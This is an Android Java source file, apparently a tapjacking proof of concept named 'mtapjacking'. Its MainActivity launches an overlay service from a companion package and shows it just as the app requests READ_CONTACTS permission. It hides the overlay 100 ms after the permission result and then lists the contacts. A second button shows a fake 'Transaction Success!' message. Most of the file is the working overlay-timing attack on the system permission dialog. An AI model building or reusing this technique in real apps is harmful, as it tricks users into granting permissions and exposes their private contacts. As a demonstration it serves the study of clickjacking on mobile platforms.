package com.iwobanas.mtapjacking;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int PERMISSIONS_REQUEST_CODE = 1;

    private Handler mHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startOverlayService("WORM_UP");

        Button button = (Button) findViewById(R.id.button);
        Button button1 = (Button) findViewById(R.id.button2);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startOverlayService("SHOW");
                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_CODE);
            }
        });
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Toast.makeText(MainActivity.this, "Transaction Success!", Toast.LENGTH_LONG).show();
            }
        });

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        startOverlayServiceDelayed("HIDE");

        if (requestCode == PERMISSIONS_REQUEST_CODE && grantResults.length > 0
                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            showContacts();
        }
    }

    private void startOverlayService(String action) {
        Intent intent = new Intent(action);
        intent.setClassName("com.iwobanas.mtapjacking.service", "com.iwobanas.mtapjacking.service.OverlayService");
        //intent.setClassName("com.iwobanas.mtapjacking", "com.iwobanas.mtapjacking.TapjackService");
        startService(intent);
    }

    private void showContacts() {
        getFragmentManager()
                .beginTransaction()
                .replace(R.id.contactListContainer, new ContactListFragment())
                .commit();
    }

    private void startOverlayServiceDelayed(final String action) {
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                startOverlayService(action);
            }
        }, 100);
    }
}
